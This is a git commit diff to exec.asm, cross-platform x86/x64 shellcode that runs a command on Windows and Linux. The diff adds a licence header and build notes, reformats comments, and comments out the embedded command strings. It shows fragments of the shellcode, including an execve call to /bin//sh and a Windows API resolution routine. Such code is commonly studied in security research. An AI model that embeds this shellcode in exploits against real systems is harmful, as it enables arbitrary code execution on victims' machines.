6060e05b09b94a796c482216401fc85c670aa536
Odzhan <odzhan@protonmail.com>
2016-06-04 05:59:41 +0100

    sc

--- exec.asm
+++ exec.asm
@@ -1,8 +1,40 @@
-
-; Shellcode to execute command
-; Runs on x86 and x64 versions of Linux/Windows
-; Odzhan/2016
-
+;
+;  Copyright © 2016 Odzhan. All Rights Reserved.
+;
+;  Redistribution and use in source and binary forms, with or without
+;  modification, are permitted provided that the following conditions are
+;  met:
+;
+;  1. Redistributions of source code must retain the above copyright
+;  notice, this list of conditions and the following disclaimer.
+;
+;  2. Redistributions in binary form must reproduce the above copyright
+;  notice, this list of conditions and the following disclaimer in the
+;  documentation and/or other materials provided with the distribution.
+;
+;  3. The name of the author may not be used to endorse or promote products
+;  derived from this software without specific prior written permission.
+;
+;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
+;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
+;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
+;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
+;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+;  POSSIBILITY OF SUCH DAMAGE.
+;
+;  Execute a command
+;  Works on 32/64-bit versions of Windows and Linux
+;
+;  yasm -fbin exec.asm -oexec.bin
+;  nasm -fbin exec.asm -oexec.bin
+;
+;  194 bytes
+;
     bits    32
     
     push    esi
@@ -51,9 +83,9 @@ get_os:
     jz      win_cmd
     
     ; we're 32-bit Linux
-    mov     al, 11           ; eax=sys_execve
-    pop     ebx              ; ebx="/bin//sh", 0
-    pop     ecx              ; ecx=argv
+    mov     al, 11            ; eax=sys_execve
+    pop     ebx               ; ebx="/bin//sh", 0
+    pop     ecx               ; ecx=argv
     int     0x80
     
     ; we're 64-bit, execute syscall and see what
@@ -123,7 +155,7 @@ fwe:
     mov     esi, [rdi+rbx+1ch]
     add     rsi, rdi
     
-    mov     esi, [rsi+4*rbp]
+    mov     esi, [rsi+rbp*4]
     add     rdi, rsi
     cdq
     call    rdi
@@ -142,7 +174,7 @@ cmd_end:
 ld_cmd:
     call   get_os
     ; place command here
-    db     "notepad", 0xFF
+    ;db     "notepad", 0xFF
     ; do not change anything below  
-    db      "-c", 0xFF, "/bin//sh", 0
+    ;db      "-c", 0xFF, "/bin//sh", 0
     
